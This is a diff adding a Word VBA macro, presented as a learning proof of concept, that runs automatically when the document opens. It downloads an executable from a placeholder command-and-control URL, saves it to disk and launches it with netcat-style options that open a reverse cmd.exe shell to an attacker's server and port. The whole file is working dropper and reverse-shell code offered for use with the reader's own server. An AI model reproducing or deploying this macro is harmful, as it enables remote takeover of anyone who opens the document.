@@ -1,0 +1,72 @@
+Private Sub Document_Open()
+
+    ' ------------------------------------------------------------------
+    ' POC PAYLOAD via MICROSOFT WORD
+    ' CallSign: CACINGBOR V.0 BETA
+    ' Author: Agus Ramadona
+    ' Creation Date: 05/06/2024
+    ' Note: For Learning Purposes Only
+    ' ///----USE AT YOUR OWN RISKS----///
+    ' ------------------------------------------------------------------
+    
+    ' ------------------------------------------------------------------
+    ' DOWNLOAD PAYLOAD FROM C2 SERVER
+    ' ------------------------------------------------------------------
+    
+    Dim url As String
+    Dim filePath As String
+    Dim xmlHttp As Object
+    Dim fileStream As Object
+
+    ' Download The Payload From C2 Server
+    ' Use your own http URL
+    url = "http://xxx.xxx.xxx/myNCTool.exec"
+    
+    ' Put on Desired Directory
+    filePath = "C:\Users\someone\temp\payload\myNCTool.exe"
+
+    ' Create XMLHTTP object
+    Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
+
+    ' Create FileStream object
+    Set fileStream = CreateObject("ADODB.Stream")
+
+    ' Open the URL in async mode
+    xmlHttp.Open "GET", url, False
+    xmlHttp.Send
+
+    ' Wait until the download is complete
+    Do While xmlHttp.ReadyState <> 4
+        DoEvents
+    Loop
+
+    ' Check the status of the download
+    If xmlHttp.Status = 200 Then
+        ' Open file stream and write data to file
+        fileStream.Open
+        fileStream.Type = 1 ' adTypeBinary
+        fileStream.Write xmlHttp.responseBody
+        fileStream.SaveToFile filePath, 2 ' adSaveCreateOverWrite
+        fileStream.Close
+        MsgBox "Download complete!"
+    Else
+        MsgBox "Failed to download file. Status: " & xmlHttp.Status
+    End If
+
+    ' Clean up
+    Set xmlHttp = Nothing
+    Set fileStream = Nothing
+    
+    ' --------------------------------------------
+    ' RUN THE PAYLOAD WHEN THE DOCUMENT OPENED.
+    ' --------------------------------------------
+    Dim command As String
+    
+    ' Command to run
+    command = "cmd.exe C:\Users\someone\temp\payload\myNCTool.exe -e cmd.exe  IPAddressOfYourServer ListenerPortUsed"
+    
+    ' Execute the command
+    Shell command, vbNormalFocus
+    
+End Sub
+
